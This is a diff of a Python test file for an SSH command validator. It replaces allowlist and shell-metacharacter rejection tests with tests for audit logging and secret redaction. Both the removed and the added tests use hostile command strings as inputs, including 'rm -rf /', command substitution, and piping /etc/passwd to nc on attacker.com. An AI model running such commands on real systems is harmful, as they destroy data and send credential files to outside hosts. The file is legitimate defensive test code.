@@ -1,99 +1,100 @@
+"""Tests for _validate_ssh_command dispatch-audit behaviour.
+
+Contract update
+---------------
+The former D-02 policy (allowlist of command prefixes + shell metacharacter
+rejection) was intentionally removed. See the docstring of
+``_validate_ssh_command`` in ``src/aila/platform/tools/ssh.py``: the
+allowlist was trivially bypassable (renamed binaries, symlinks, aliases,
+shell builtins) so the real security boundary is the SSH user's OS-level
+permissions on the target machine. Operators pick an unprivileged user
+when registering a system.
+
+The remaining contract is audit-only: every call MUST emit an
+``ssh.command_dispatch`` INFO record whose ``command`` extra carries the
+redacted command line. These tests defend that contract.
+"""
 from __future__ import annotations
 
-import pytest
+import logging
 
 from aila.platform.tools.ssh import _validate_ssh_command
 
+_SSH_LOGGER = "aila.platform.tools.ssh"
 
-class TestAllowlistedCommandsPass:
-    """Allowlisted commands pass through without raising."""
 
-    def test_dpkg_query(self):
-        _validate_ssh_command("dpkg-query -W -f='${Package}\t${Version}\n'")
+def _dispatch_records(caplog):
+    return [r for r in caplog.records if r.message == "ssh.command_dispatch"]
 
-    def test_apt_list(self):
-        _validate_ssh_command("apt list --installed")
 
-    def test_apk_info(self):
-        _validate_ssh_command("apk info -v")
+class TestAuditLogDispatch:
+    """Every call emits one INFO record under the ssh.command_dispatch key."""
 
-    def test_pacman_query(self):
-        _validate_ssh_command("pacman -Q")
+    def test_emits_dispatch_log(self, caplog):
+        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
+        _validate_ssh_command("dpkg-query -W")
+        records = _dispatch_records(caplog)
+        assert len(records) == 1
+        assert records[0].levelno == logging.INFO
+        assert records[0].name == _SSH_LOGGER
 
-    def test_cat_etc_os_release(self):
-        _validate_ssh_command("cat /etc/os-release")
-
-    def test_uname_r(self):
+    def test_command_extra_carries_command_verbatim_when_no_secret(self, caplog):
+        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
         _validate_ssh_command("uname -r")
+        records = _dispatch_records(caplog)
+        assert records
+        assert getattr(records[-1], "command", "") == "uname -r"
 
-    def test_lsb_release(self):
-        _validate_ssh_command("lsb_release -a")
-
-    def test_rpm_qa(self):
+    def test_each_call_emits_its_own_record(self, caplog):
+        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
+        _validate_ssh_command("apt list --installed")
         _validate_ssh_command("rpm -qa")
-
-    def test_yum_list(self):
-        _validate_ssh_command("yum list installed")
-
-    def test_dnf_list(self):
-        _validate_ssh_command("dnf list installed")
-
-    def test_zypper_packages(self):
-        _validate_ssh_command("zypper packages --installed-only")
+        records = _dispatch_records(caplog)
+        assert len(records) == 2
+        commands = [getattr(r, "command", "") for r in records]
+        assert "apt list --installed" in commands
+        assert "rpm -qa" in commands
 
 
-class TestPrefixRejection:
-    """Commands not starting with an allowlisted prefix raise ValueError."""
+class TestSecretRedaction:
+    """Inline secrets in the command are redacted before hitting the log."""
 
-    def test_echo_rejected(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("echo hello")
+    def test_password_flag_value_is_redacted(self, caplog):
+        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
+        _validate_ssh_command("mysql -p hunter2 -e 'select 1'")
+        records = _dispatch_records(caplog)
+        assert records
+        command = getattr(records[-1], "command", "")
+        assert "hunter2" not in command
+        assert "[REDACTED]" in command
 
-    def test_ls_rejected(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("ls /tmp")
-
-
-class TestMetacharacterRejection:
-    """Commands containing shell metacharacters raise ValueError."""
-
-    def test_semicolon(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("dpkg-query -W; rm -rf /")
-
-    def test_double_ampersand(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("apt list && curl attacker.com")
-
-    def test_double_pipe(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("uname -r || true")
-
-    def test_pipe(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("cat /etc/passwd | nc attacker.com 4444")
-
-    def test_command_substitution_dollar(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("dpkg-query $(id)")
-
-    def test_backtick(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("uname `id`")
-
-    def test_redirect_out(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("cat /etc/passwd > /tmp/out")
-
-    def test_redirect_in(self):
-        with pytest.raises(ValueError, match="rejected"):
-            _validate_ssh_command("cat /etc/passwd < /dev/urandom")
+    def test_password_kv_is_redacted(self, caplog):
+        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
+        _validate_ssh_command("curl -H 'authorization: bearer abc123xyz' http://x/")
+        records = _dispatch_records(caplog)
+        assert records
+        command = getattr(records[-1], "command", "")
+        assert "abc123xyz" not in command
+        assert "[REDACTED]" in command
 
 
-class TestMetacharacterBeforePrefix:
-    """Metacharacter check fires before prefix check (D-02 ordering)."""
+class TestDoesNotRaiseForRemovedPolicy:
+    """The former allowlist and metacharacter rejection are gone.
 
-    def test_allowlisted_prefix_with_metachar_rejected(self):
-        # dpkg-query is allowlisted but contains ';'
-        with pytest.raises(ValueError, match="metacharacter"):
-            _validate_ssh_command("dpkg-query -W; rm -rf /")
+    The prior D-02 test suite asserted ``pytest.raises(ValueError)`` for
+    non-allowlisted prefixes and shell metacharacters. Those assertions are
+    inverted here to defend the current contract: the function MUST NOT raise
+    on any command string, since command filtering is no longer the security
+    boundary.
+    """
+
+    def test_metacharacter_command_does_not_raise(self):
+        _validate_ssh_command("dpkg-query -W; rm -rf /")
+
+    def test_non_allowlisted_prefix_does_not_raise(self):
+        _validate_ssh_command("echo hello")
+        _validate_ssh_command("ls /tmp")
+
+    def test_pipe_and_redirect_do_not_raise(self):
+        _validate_ssh_command("cat /etc/passwd | nc host 4444")
+        _validate_ssh_command("cat /etc/passwd > /tmp/out")
